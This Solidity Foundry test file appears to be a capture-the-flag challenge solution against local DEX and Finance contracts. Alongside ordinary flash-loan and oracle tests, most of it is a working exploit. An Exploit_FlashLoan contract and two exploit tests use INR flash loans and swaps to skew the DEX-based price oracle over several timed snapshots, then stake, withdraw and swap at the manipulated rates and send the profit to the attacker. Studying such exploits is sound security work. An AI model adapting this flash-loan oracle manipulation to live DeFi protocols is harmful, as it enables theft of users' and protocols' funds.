//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test,console} from "forge-std/Test.sol";
import {DEX} from "src/DEX.sol";
import {Finance} from "src/Finance.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import "src/interfaces/IERC3156FlashBorrower.sol";
import {test_Flash_Loan} from "../Mocks/test_Flash_Loan.t.sol";
import {INR_PRICE_MANIPULATION} from "../Mocks/INR_PRICE_MANIPULATION.t.sol";
contract testChall is Test{
    address ADMIN=makeAddr("ADMIN");
    address LP=makeAddr("LIQUIDITY PROVIDER");
    address TESTER=makeAddr("TESTER");
    address Price_Fetcher=makeAddr("PRICE_FETCHER");
    DEX public dex;
    Finance public finance;
    uint256 WETH_LIQUIDITY=50_000 ether;
    uint256 INR_LIQUIDITY= 2_30_000 * 50_000 ether;
    uint256 TESTER_WETH_LIQUIDITY =100 ether;
    uint256 TESTER_INR_LIQUIDITY = 2_30_000 * 100 ether;
    uint256 PRICE_FETCHER_WETH_LIQUIDIY=100 ether;
    uint256 PRICE_FETCHER_INR_LIQUIDIY = 2_30_000 * 100 ether;
    address WETH;
    address INR;
    uint256 WETH_LOAN_AMOUNT=50_000 ether;
    uint256 INR_LOAN_AMOUNT=50_000 * 2_30_000 ether;

    function setUp()public{
        startHoax(ADMIN);
        dex=new DEX();
        finance=new Finance{value: 550_000 ether}(0,type(uint256).max,type(uint256).max,address(dex));
        WETH=address(finance.WETH());
        INR=address(finance.INR());
        dex.initialize(WETH,INR );
        finance.mint(WETH,LP,WETH_LIQUIDITY);
        finance.mint(INR,LP,INR_LIQUIDITY);
        deal(TESTER, 2* 12501 ether);
        vm.stopPrank();
    }

    modifier addLiquidityToPool(){
        startHoax(LP);
        IERC20(WETH).transfer(address(dex), WETH_LIQUIDITY);
        IERC20(INR).transfer(address(dex), INR_LIQUIDITY);
        dex.mint(LP);
        vm.stopPrank();
        _;
    }

    modifier sendTokensToPriceFetcher(){
        startHoax(ADMIN);
        finance.mint(WETH,Price_Fetcher,PRICE_FETCHER_WETH_LIQUIDIY);
        finance.mint(INR,Price_Fetcher,PRICE_FETCHER_INR_LIQUIDIY);
        vm.stopPrank();
        _;
    }

    function test_Flash_Loan_Works_Expected()public{
        startHoax(TESTER);
        test_Flash_Loan _test_Flash_Loan=new test_Flash_Loan(WETH,INR);
        // WETH LOAN
        bytes memory data;
        finance.flashLoan(IERC3156FlashBorrower(address(_test_Flash_Loan)), WETH, WETH_LOAN_AMOUNT, data);

        //INR LOAN
        finance.flashLoan(IERC3156FlashBorrower(address(_test_Flash_Loan)), INR, INR_LOAN_AMOUNT, data);
        vm.stopPrank();
        console.log("WETH Loan Amount :",_test_Flash_Loan.lastWethLoanReceived());
        console.log("INR Loan Amount :",_test_Flash_Loan.lastInrLoanReceived());
        assertEq(_test_Flash_Loan.lastWethLoanReceived(), WETH_LOAN_AMOUNT);
        assertEq(_test_Flash_Loan.lastInrLoanReceived(),INR_LOAN_AMOUNT );
    }

    function test_Price_Oracle()public addLiquidityToPool sendTokensToPriceFetcher{
        startHoax(Price_Fetcher);
        console.log(dex.timeStampLast());
        vm.warp(61);
        finance.snapshot();
        vm.warp(78);
        dex.sync();
        (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
        console.log("WETH PRICE IN INR :",_wethprice>>112);
    }


    function test_Manipulation_Of_INR_Price_Using_FlashLoan()public addLiquidityToPool{
        startHoax(TESTER);
        INR_PRICE_MANIPULATION flashloan=new INR_PRICE_MANIPULATION(WETH,INR,address(dex),address(finance));
        vm.warp(61); // To pass 1 minute check in Finance:snapshot
        finance.snapshot();
        bytes memory data;
        //vm.expectRevert();
        /* Before running this test make sure to comment vm.expectRevert() 
        and flashloan repayment steps in Finance:flashLoan(). If it is not commented*/
        vm.expectRevert();
        finance.flashLoan(IERC3156FlashBorrower(address(flashloan)), INR, INR_LOAN_AMOUNT, data);
        
        vm.stopPrank();
    }

    function test_Exploit_FlashLoan1()public addLiquidityToPool{
        startHoax(TESTER);
        Exploit_FlashLoan exploit=new Exploit_FlashLoan{value: 2* 12500e18}(WETH,INR,address(dex),address(finance));
        vm.warp(61);
        finance.snapshot();
        ////////////////////////   STEP1  ////////////////////////////
        console.log("----------------------------");
        console.log("-----------STEP-1-----------");
        console.log("----------------------------");
        bytes memory data;
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)),INR, INR_LOAN_AMOUNT, data);
        (uint256 _wethpriceAfterStep1,uint256 _inrPriceAfterStep1)=finance.getPrice();
        //console.log("WETH PRICE AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        // The price will be 4x of initial price. At the end though we made the swap price same as before it
        // wont update beacuse with in a single timestamp _update will update only once. So manipulated price 
        // remains constant. In order to get the previous swap rates we need to get new snapshot and price.
        
     
        ////////////////////////   STEP2  ////////////////////////////
        vm.warp(121);
        finance.snapshot();
        //console.log("FINANCE SNAPSHOT :",finance.lastSnapshotTime()); 
        dex.sync();
        (_wethpriceAfterStep1,_inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE SETTLED AFTER STEP-1 :",_wethpriceAfterStep1>>112);
        console.log();
        
        console.log("----------------------------");
        console.log("-----------STEP-2-----------");
        console.log("----------------------------");

        uint256 INR_BALANCE_IN_STEP2=IERC20(INR).balanceOf(TESTER);
        console.log(INR_BALANCE_IN_STEP2);
        IERC20(INR).transfer(address(finance),INR_BALANCE_IN_STEP2);
        uint256 Step2balanceBefore=address(TESTER).balance;
        finance.withdraw(INR,INR_BALANCE_IN_STEP2);
        uint256 Step2balanceAfter=address(TESTER).balance;
        uint256 netStep2=Step2balanceAfter-Step2balanceBefore;
        console.log("ETHER RECEIVED FOR WITHDRAW IN STEP 2 :",netStep2);
        finance.stake{value :netStep2}(WETH);
        uint256 WETH_BALANCE_IN_STEP_2=IERC20(WETH).balanceOf(TESTER);
        console.log("WETH BALANCE IN STEP-2 :",WETH_BALANCE_IN_STEP_2);
        
        ////////////////////////   STEP-3  ////////////////////////////
        // If we do this in the STEP2 the price wont be manipulated because price is already updated after
        // the sync. So price    manipulation by flashloan doesnt work.

        console.log("----------------------------");
        console.log("-----------STEP-3-----------");
        console.log("----------------------------");
        vm.warp(181);
        finance.snapshot();
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)),INR, INR_LOAN_AMOUNT, data);
     
        ////////////////////////   STEP-4  ////////////////////////////
        console.log(IERC20(INR).balanceOf(TESTER));
        console.log("----------------------------");
        console.log("-----------STEP-4-----------");
        console.log("----------------------------");
        vm.warp(241);
        finance.snapshot();
        dex.sync();

        (_wethpriceAfterStep1,_inrPriceAfterStep1)=finance.getPrice();
        console.log("WETH PRICE SETTLED AFTER STEP-3 :",_wethpriceAfterStep1);


        vm.warp(301);
        finance.snapshot();

        uint256 WETH_BALANCE=IERC20(WETH).balanceOf(TESTER);
        IERC20(WETH).transfer(address(dex), WETH_BALANCE);
        uint256 _balanceBefore=IERC20(INR).balanceOf(TESTER);
        dex.swap(WETH, WETH_BALANCE, 0, TESTER);
        uint256 _balanceAfter=IERC20(INR).balanceOf(TESTER);
        uint256 _netBalance=_balanceAfter-_balanceBefore;
        console.log("NET BALANCE :",_netBalance);

        uint256 _INR_TO_DEPOSIT=IERC20(INR).balanceOf(TESTER)-_netBalance;
        IERC20(INR).transfer(address(finance), _INR_TO_DEPOSIT);
        uint256 _beforeBalanceStep4=TESTER.balance;
        (_wethpriceAfterStep1,_inrPriceAfterStep1)=finance.getPrice();
        finance.withdraw(INR,_INR_TO_DEPOSIT);
        uint256 _beforeAfterStep4=TESTER.balance;
        uint256 ETHER_DUR_TO_WITHDRAW=_beforeAfterStep4-_beforeBalanceStep4;
        
        uint256 INR_BALANCE=IERC20(INR).balanceOf(TESTER);
        console.log(INR_BALANCE);
        IERC20(INR).transfer(address(dex), INR_BALANCE);
        console.log("WETH BEFORE",IERC20(WETH).balanceOf(TESTER));
        dex.swap(INR, INR_BALANCE, 0, TESTER);
        console.log(dex.reserve1());
        console.log(dex.reserve0());
        console.log("WETH AFTER",IERC20(WETH).balanceOf(TESTER));
        console.log(ETHER_DUR_TO_WITHDRAW);

    }
    
    
    
    function test_Exploit_FlashLoan()public addLiquidityToPool{
        startHoax(TESTER);
        Exploit_FlashLoan exploit=new Exploit_FlashLoan{value: 2* 12500e18}(WETH,INR,address(dex),address(finance));
        vm.warp(61); // To pass 1 minute check in Finance:snapshot
        finance.snapshot();
        bytes memory data;
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)), INR, INR_LOAN_AMOUNT, data);
        console.log(IERC20(INR).balanceOf(TESTER)); //11500000000000000000000000000
        vm.warp(121);
        finance.snapshot();
        dex.sync();
        (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
        console.log("WETH PRICE :",_wethprice);
        uint256 INR_BALANCE=IERC20(INR).balanceOf(TESTER);
        IERC20(INR).transfer(address(finance), INR_BALANCE);
        uint256 _balanceBefore=address(TESTER).balance;
        finance.withdraw(INR,INR_BALANCE );
        uint256 _balanceAfter=address(TESTER).balance;
        uint256 _balance=_balanceAfter-_balanceBefore;
        console.log("ETH BALANCE AFTER EXCHANGING INR :",_balance);
        finance.stake{value: _balance}(WETH);
        console.log("WETH BALANCE AFTER STAKING ETH :",IERC20(WETH).balanceOf(TESTER));
        console.log("INR BALANCE OF TESTER :",IERC20(INR).balanceOf(TESTER));
        vm.warp(181);
        finance.snapshot();
        finance.flashLoan(IERC3156FlashBorrower(address(exploit)), INR, INR_LOAN_AMOUNT, data);
        ( _wethprice, _inrPrice)=finance.getPrice();
        console.log("WETH PRICE :",_wethprice);
        uint256 _amountIn=IERC20(WETH).balanceOf(TESTER);
        IERC20(WETH).transfer(address(dex), _amountIn);
        dex.swap(WETH, _amountIn, 0, TESTER);

        vm.warp(241);
        finance.snapshot();
        dex.sync();

        INR_BALANCE=IERC20(INR).balanceOf(TESTER);
        IERC20(INR).transfer(address(finance), INR_BALANCE);
        _balanceBefore=address(TESTER).balance;
        finance.withdraw(INR,INR_BALANCE );
        _balanceAfter=address(TESTER).balance;
        _balance=_balanceAfter-_balanceBefore;
        console.log("ETH BALANCE AFTER EXCHANGING INR :",_balance);
        IERC20(INR).transfer(address(dex), IERC20(INR).balanceOf(TESTER));
        (uint256 out)=dex.swap(INR, IERC20(INR).balanceOf(TESTER), 0, TESTER);
        console.log("WETH BALANCE OF TESTER :",IERC20(WETH).balanceOf(TESTER));
        console.log(out);
        console.log(dex.reserve0());
    }


}


contract Exploit_FlashLoan is IERC3156FlashBorrower{
    uint256 public lastWethLoanReceived;
    uint256 public lastInrLoanReceived;
    address WETH;
    address INR;
    DEX dex;
    Finance public finance;
    address owner;
    constructor(address _weth,address _inr,address _dex,address _finance) payable {
        WETH=_weth;
        INR=_inr;
        dex=DEX(_dex);
        finance=Finance(_finance);
        owner=msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        if(token==WETH){
            lastWethLoanReceived=amount;
        }else if(token==INR){
            lastInrLoanReceived=amount;
        }
        IERC20(token).transfer(address(dex), amount);
        dex.swap(token, amount, 0, address(this));

        if(token==WETH){
            uint256 _balance=IERC20(INR).balanceOf(address(this));
            IERC20(INR).transfer(address(dex), _balance);
            dex.swap(INR, _balance, 0, address(this));
            (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
            console.log("INR PRICE IN WETH :",_inrPrice);
        }else{
            finance.stake{value : 12_500e18}(INR);
            uint256 _balance=IERC20(WETH).balanceOf(address(this));
            IERC20(WETH).transfer(address(dex), _balance);
            dex.swap(WETH, _balance, 0, address(this));
            (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
            console.log("WETH PRICE IN INR :",_wethprice);
        }
        
        IERC20(token).approve(msg.sender, amount);
        uint256 _balance_after_exploit=IERC20(INR).balanceOf(address(this));
        console.log("INR BALANCE OF EXPLOITER AFTER EXPLOIT :",_balance_after_exploit-amount);
        IERC20(token).transfer(owner,_balance_after_exploit-amount);
        
        return bytes32(data);
    }  
}

